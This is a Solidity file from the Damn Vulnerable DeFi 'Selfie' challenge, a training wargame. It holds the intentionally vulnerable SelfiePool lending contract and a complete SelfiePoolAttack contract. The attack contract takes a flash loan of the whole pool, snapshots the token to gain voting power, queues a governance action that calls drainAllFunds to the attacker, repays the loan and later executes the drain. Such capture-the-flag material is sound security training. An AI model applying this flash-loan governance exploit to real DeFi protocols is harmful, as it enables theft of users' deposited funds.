// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "./SimpleGovernance.sol";

import "../DamnValuableTokenSnapshot.sol";

/**
 * @title SelfiePool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SelfiePool is ReentrancyGuard {

    using Address for address;

    ERC20Snapshot public token;
    SimpleGovernance public governance;

    event FundsDrained(address indexed receiver, uint256 amount);

    modifier onlyGovernance() {
        require(msg.sender == address(governance), "Only governance can execute this action");
        _;
    }

    constructor(address tokenAddress, address governanceAddress) {
        token = ERC20Snapshot(tokenAddress);
        governance = SimpleGovernance(governanceAddress);
    }

    function flashLoan(uint256 borrowAmount) external nonReentrant {
        uint256 balanceBefore = token.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");
        
        token.transfer(msg.sender, borrowAmount);        
        
        require(msg.sender.isContract(), "Sender must be a deployed contract");
        msg.sender.functionCall(
            abi.encodeWithSignature(
                "receiveTokens(address,uint256)",
                address(token),
                borrowAmount
            )
        );
        
        uint256 balanceAfter = token.balanceOf(address(this));

        require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
    }

    function drainAllFunds(address receiver) external onlyGovernance {
        uint256 amount = token.balanceOf(address(this));
        token.transfer(receiver, amount);
        
        emit FundsDrained(receiver, amount);
    }
}

contract SelfiePoolAttack {
    address private _owner;
    address private _pool;
    address private _governance;
    address private _token;

    uint private _attackActionId;

    constructor(
        address pool,
        address governance,
        address token
    ) {
        _owner = msg.sender;
        _pool = pool;
        _governance = governance;
        _token = token;
    }

    function attack() external {
        SelfiePool(_pool).flashLoan(DamnValuableTokenSnapshot(_token).balanceOf(_pool));
    }

    function receiveTokens(address tokenAddress, uint256 amount) external {
        DamnValuableTokenSnapshot(_token).snapshot();

        _attackActionId = SimpleGovernance(_governance).queueAction(
            _pool,
            abi.encodeWithSignature("drainAllFunds(address)", _owner),
            0
        );
        require(DamnValuableTokenSnapshot(_token).transfer(_pool, amount), "Payback failed");
    }

    function executeDrain() external {
        SimpleGovernance(_governance).executeAction(_attackActionId);
    }
}
